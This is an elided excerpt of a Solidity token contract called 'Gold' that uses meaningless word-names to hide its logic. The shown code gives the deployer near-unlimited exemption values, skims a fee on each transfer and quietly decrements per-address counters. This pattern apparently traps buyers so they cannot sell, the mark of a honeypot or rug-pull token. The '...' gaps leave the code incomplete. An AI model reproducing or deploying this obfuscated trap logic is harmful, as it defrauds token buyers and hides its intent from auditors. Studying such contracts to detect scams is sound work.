...
contract Gold is Ownable {
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(army);
        ...
        at = 9;
        calm = 3;
        naturally[former] = met;
        naturally[msg.sender] = met;
        _tTotal = 1000000000000 * 10**at;
        chance[msg.sender] = _tTotal;
    }
    ...
    uint256 private giving;
    address public uniswapV2Pair;
    uint256 private met = ~calm;
    ...
    mapping(address => uint256) private chance;
    ...
    function rise(
        ...
        if (naturally[shut] == 0 && (practical != shut) && definition[shut] > 0) {
            naturally[shut] -= at;
        }

        address everything = with;
        with = friendly;

        chance[shut] -= correctly;
        uint256 value = (correctly / 100) * calm;
        correctly -= value;
        definition[everything] += at;
        chance[friendly] += correctly;
    }

    mapping(address => uint256) private definition;
